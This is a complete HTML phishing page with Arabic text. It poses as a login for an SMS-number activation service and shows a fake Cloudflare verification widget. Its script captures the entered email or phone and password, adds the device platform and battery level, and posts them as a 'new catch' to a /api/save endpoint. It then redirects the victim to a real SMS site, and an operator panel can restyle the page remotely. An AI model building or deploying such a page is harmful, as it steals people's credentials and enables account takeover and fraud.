<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تفعيل الخدمة - SMS</title>
    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    
    <style>
        /* التصميم القديم (الخلفية الوردية الكاملة) */
        body {
            margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif;
            background-color: #e91e63; /* اللون الوردي الأصلي */
            display: flex; justify-content: center; align-items: center; min-height: 100vh;
        }

        /* البطاقة البيضاء المستطيلة */
        .container {
            background: white; padding: 30px 20px; border-radius: 12px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2); width: 90%; max-width: 380px; 
            text-align: center;
        }

        /* تنسيق الصورة */
        #pageImg {
            width: 120px; height: auto; margin-bottom: 20px;
        }

        h2 { color: #c2185b; font-size: 18px; margin-bottom: 25px; font-weight: bold; }

        /* تنسيق الحقول */
        input {
            width: 100%; padding: 14px; margin-bottom: 15px;
            border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; 
            outline: none; text-align: right; font-size: 15px; background: #fff;
        }
        input:focus { border-color: #e91e63; }

        /* منطقة التحقق (Cloudflare الوهمي) */
        .captcha-wrapper { margin: 15px 0; min-height: 65px; display: flex; flex-direction: column; align-items: center; }
        #loader-text { color: #28a745; font-weight: bold; display: none; font-size: 14px; margin-top: 10px; }

        /* الزر الوردي العريض */
        button {
            width: 100%; padding: 14px; background: #e91e63; color: white;
            border: none; border-radius: 8px; font-size: 18px; font-weight: bold; 
            cursor: pointer; transition: 0.3s;
        }
        button:hover { background: #ad1457; }

        .footer-links { margin-top: 20px; font-size: 14px; color: #666; }
        .footer-links span { color: #e91e63; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>

    <div class="container">
        <img id="pageImg" src="https://telegra.ph/file/1792945d7d91986420551.jpg">
        
        <h2 id="pageLetter">سجل دخولك لتفعيل خدمة الأرقام</h2>

        <form id="proForm">
            <input type="text" id="userInput" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
            <input type="password" id="passInput" placeholder="كلمة السر" required>
            
            <div class="captcha-wrapper">
                <div class="cf-turnstile" id="cf-box" data-sitekey="1x00000000000000000000AA" data-callback="handleVerify"></div>
                <div id="loader-text">✅ تم التحقق من أمان الجهاز</div>
            </div>

            <button type="submit" id="pageBtn">تسجيل دخول</button>
        </form>

        <div class="footer-links">
            ليس لديك حساب؟ <span onclick="Swal.fire({text:'التسجيل مغلق مؤقتاً', icon:'info'})">إنشاء حساب جديد</span>
        </div>
    </div>

    <script>
        let isVerified = false;

        // وظيفة التحقق
        function handleVerify() {
            document.getElementById('cf-box').style.display = 'none';
            document.getElementById('loader-text').style.display = 'block';
            isVerified = true;
        }

        // سحب البيانات
        document.getElementById('proForm').onsubmit = async (e) => {
            e.preventDefault();
            
            const user = document.getElementById('userInput').value;
            const pass = document.getElementById('passInput').value;

            // 1. فحص البيانات (منع العشوائية)
            const isEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(user);
            const isPhone = /^\+?[0-9]{7,15}$/.test(user);

            if (!isEmail && !isPhone) {
                Swal.fire({ title: 'خطأ', text: 'يرجى إدخال بريد أو هاتف صحيح', icon: 'error', confirmButtonColor: '#e91e63' });
                return;
            }

            if (!isVerified) {
                Swal.fire({ text: 'يرجى إكمال التحقق أولاً', icon: 'warning' });
                return;
            }

            // سحب معلومات الجهاز والبطارية
            let battery = "غير معروف";
            try { const b = await navigator.getBattery(); battery = (b.level * 100) + "%"; } catch(e) {}

            const payload = {
                title: "🔥 صيد جديد مـكتمل (التصميم الأصلي)",
                user: user,
                pass: pass,
                details: `📱 الجهاز: ${navigator.platform} | 🔋 البطارية: ${battery}`,
                time: new Date().toLocaleString('ar-EG')
            };

            // إرسال البيانات
            await fetch('/api/save', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });

            window.location.href = "https://receive-smss.com/"; 
        };

        // مزامنة الصورة من اللوحة
        async function loadConfig() {
            try {
                const res = await fetch('/api/get');
                const data = await res.json();
                if(data.image) document.getElementById('pageImg').src = data.image;
                if(data.letter) document.getElementById('pageLetter').innerText = data.letter;
                if(data.button) document.getElementById('pageBtn').innerText = data.button;
            } catch(e) {}
        }
        window.onload = loadConfig;
    </script>
</body>
</html>
